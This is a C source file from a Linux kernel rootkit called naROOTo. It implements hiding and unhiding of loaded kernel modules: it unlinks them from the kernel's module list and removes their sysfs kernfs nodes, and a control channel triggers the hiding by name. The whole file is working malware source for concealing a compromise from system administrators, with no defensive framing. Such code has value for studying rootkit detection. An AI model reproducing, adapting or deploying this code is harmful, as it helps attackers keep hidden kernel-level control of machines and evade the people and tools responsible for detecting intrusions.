/******************************************************************************
 *
 * Name: hide_module.c 
 * This file contains all necessary functions for hiding the modules
 *
 *****************************************************************************/
/*
 * This file is part of naROOTo.

 * naROOTo is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * naROOTo is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/rbtree.h>
#include <linux/hash.h>

#include "control.h"
#include "include.h"
#include "sysmap.h"

#define member rb

LIST_HEAD(hidden_modules);

typedef struct module * func(char *name);
func* find_module1 = (func*) sysmap_find_module;

struct mutex *mod_mutex = (struct mutex *) (sysmap_module_mutex);
struct list_head *modules = (struct list_head *) sysmap_modules;

/*
 * Function to check if the module is hidden
 */
struct module *
find_hidden_module(char* name)
{
	struct module* mod;

	list_for_each_entry(mod, &hidden_modules, list) {
		if (strcmp(mod->name, name) == 0) {
			return mod;
		}
	}

	return NULL;
}

/*
 * Function to remove the module from kernel file system
 */
static int
kernfs_remove_node(struct kernfs_node *kn)
{
	/*
	 * rb_erase: Function defined in <rbtree.h>, Unlinks kernfs_node from sibling tree 
	 * Line 272@Linux/fs/kernfs/dir.c  
	 */
	rb_erase(&kn->rb, &kn->parent->dir.children);
	RB_CLEAR_NODE(&kn->rb);
	return 0;
}

/*
 * Function to find the position, to where the module will be inserted
 */
int
name_compare(unsigned int hash, const char *name, const void *ns, const struct kernfs_node *kn)
{
	if(hash != kn->hash)
		return hash - kn->hash;
	if(ns != kn->ns)
		return ns - kn->ns;
	return strcmp(name,kn->name);
}

/*
 * Function to insert the module to kernel file system
 * Note: kernfs is implemented as rb tree and there are no functions in kernel 
 * to do this automatically. we need to search in the tree for the position to 
 * insert then link the node and color the tree. 
 */
int
kernfs_insert_node(struct kernfs_node *kn)
{
	struct rb_node **node = &kn->parent->dir.children.rb_node;
	struct rb_node *parent = NULL;

	while(*node)
	{
		struct kernfs_node *pos;
		int result;
		/* Get the kernfs_node from rb, rb_to_kn() */
		pos = rb_entry(*node, struct kernfs_node, member);
		parent = *node;
		/*compare the names to get the position to insert in rb tree*/
		result = name_compare(kn->hash, kn->name, kn->ns, pos);

		if(result < 0)
			node = &pos->rb.rb_left;
		else if(result > 0)
			node = &pos->rb.rb_right;
		else
			return -EEXIST;
	}

	/* Add new node and reblance the tree*/
	rb_link_node(&kn->rb,parent,node);
	rb_insert_color(&kn->rb, &kn->parent->dir.children);

	/* Successfully added, account subdir number */
	if (kernfs_type(kn) == KERNFS_DIR)
		kn->parent->dir.subdirs++;

	return 0;
}

/*
 * Function to hide the module when the modules is given
 */
int
hide_module_bymod(struct module *mod)
{
	int retv;

	ROOTKIT_DEBUG("Deleting module: %s\n", mod->name);

	list_del(&mod->list);
	retv = kernfs_remove_node(mod->mkobj.kobj.sd);
	list_add_tail(&mod->list, &hidden_modules);

	return retv;
}

/*
 * Function to un hide the module, when it's given
 */
int
unhide_module_bymod(struct module *mod)
{
	ROOTKIT_DEBUG("Inserting module: %s\n", mod->name);
        
	/* Delete from the modules list */
	list_del(&mod->list);
	list_add(&mod->list, modules);
	return kernfs_insert_node(mod->mkobj.kobj.sd);
}

/*
 * This is called from the CC, takes the module name, finds module using the kernel method
 * find_module(name) and calls hide_module_bymod
 */
int
hide_module_byname(char *name)
{
	int retv;
	struct module *mod;

	mutex_lock(mod_mutex);
	mod = find_module1(name);
	mutex_unlock(mod_mutex);

	if(mod)
		retv = hide_module_bymod(mod);
	else
	{
		ROOTKIT_DEBUG("Module not found %s\n", name);	
		retv = -EEXIST;
	}
	return retv;
}

/*
 * Function called from CC to unhide module.
 * Finds the modules from hidden module list and call unhide_module_bymod
 */
int
unhide_module_byname(char *name)
{
	int retv;
	struct module *mod;
	mod = find_hidden_module(name);
	
	if(mod)
		retv = unhide_module_bymod(mod);
	else
	{
		ROOTKIT_DEBUG("Module not found %s\n", name);
		retv = -EEXIST;
	}

	return retv;
}

/*
 * Called when unloading the rootkit, to make sure no module is hidden
 */
void unhook_modules(void)
{
	while(hidden_modules.next != &hidden_modules)
	{
		struct module* mod = container_of(hidden_modules.next, struct module, list);
		unhide_module_bymod(mod);
	}
}
